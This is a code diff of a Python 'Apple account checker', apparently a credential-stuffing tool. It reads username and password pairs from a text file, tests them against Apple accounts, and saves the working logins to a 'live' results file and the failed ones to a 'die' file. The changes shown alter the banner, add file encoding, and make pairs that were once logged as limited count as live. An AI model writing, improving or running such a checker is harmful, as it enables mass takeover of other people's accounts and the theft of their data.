@@ -49,17 +49,14 @@ def main():
  clear = "\x1b[0m"
  colors = [36,30]
  xloogo = (""" 
-	╔┓┏╦━━╦┓╔┓╔━━╗
-	║┗┛║┗━╣┃║┃║00║
-	║┏┓║┏━╣┗╣┗╣╰╯║
-	╚┛┗╩━━╩━╩━╩━━
-    DDDDDDDDDD  SSSSSSSSSS
-    DD      DD  SS      SS
-    DD      DD          SS
-    DD      DD  SSSSSSSSSS
-    DD      DD  SS        
-    DD      DD  SS      SS     
-    DDDDDDDDDD  SSSSSSSSSS
+	  _____   __          __  _    __  ___ ______ ______ ___  
+	|  __ \  \ \        / / | |  /_ |/ _ \____  |____  / _ \ 
+	| |  | |__\ \  /\  / /__| |__ | | (_) |  / /    / / (_) |
+	| |  | / __\ \/  \/ / _ \ '_ \| |\__, | / /    / / > _ < 
+	| |__| \__ \\  /\  /  __/ |_) | |  / / / /    / / | (_) |
+	|_____/|___/ \/  \/ \___|_.__/|_| /_/ /_/    /_/   \___/              
+	# APPLE.COM ACCOUNT Checker
+	# V2.0  [No LIMITE JUST LIVE AND DIE]                                                  
  """)
  for N, line in enumerate(xloogo.split("\n")):
             sys.stdout.write("\x1b[1;%dm%s%s\n" % (h.choice(colors), line, clear))
@@ -67,7 +64,7 @@ def main():
  print(yell) 
  slowprint(" WEB19778 > Accurate 100%")
  slowprint(pazzo(" NOTE : ACCOUNT TXT FILE NEED TO BE USERNAME[SPLIT]PASSWORD\n","red"))
- print("[+] Coded By DsWeb19778 >> 2019 [REALYEAR]")
+ print("[+] Coded By DsWeb19778 >> 2019")
  print("[+] CopyRight | >> facebook.com/name.path")
  print("[+] APPLE VALID ACCOUNT CHECKER ...")
  def mydate(): # FUnction FOr DATE
@@ -114,7 +111,7 @@ def main():
  def starts():
   try :
    mod = "r+"
-   open_me = open(my_file,mod)
+   open_me = open(my_file,mod,encoding="utf-8")
    read_me = open_me.readlines()
    get_listcount = len(read_me) 
    ## COUNT LIST ##
@@ -151,12 +148,6 @@ def main():
         save_invalid = open("rzlt/die.txt","a+")
         save_invalid.write("DIE : "+my_email+" | "+my_pass+"\n")
         
-    elif(live in connect):
-     # save valid
-        print(time_full+green+"[+] LIVE ACCOUNT >> "+my_email+" | "+my_pass+"")
-        save_valid = open("rzlt/live.txt","a+")
-        save_valid.write("LIVE : "+my_email+" | "+my_pass+"\n")
-        
     #elif(limited in connect):
     #    save limited
     #    print("[!] LIMITED ACCOUNT >> "+my_email+" | "+my_pass+"")
@@ -164,9 +155,9 @@ def main():
     #    save_lim.write("LIMITED : "+my_email+" | "+my_pass+"\n")     
         
     else:
-        print(time_full+yellow+"[!] LIMITED ACCOUNT >>> "+my_email+" | "+my_pass+"")
-        save_lim = open("rzlt/limited.txt","a+")
-        save_lim.write("LIMITED : "+my_email+" | "+my_pass+"\n")
+      	print(time_full+green+"[+] LIVE ACCOUNT >> "+my_email+" | "+my_pass+"")
+      	save_valid = open("rzlt/live.txt","a+")
+      	save_valid.write("LIVE : "+my_email+" | "+my_pass+"\n")
 
   except IOError as myerr:
    print("[-][-__-] Connection Problem or File Errors >> "+str(myerr))
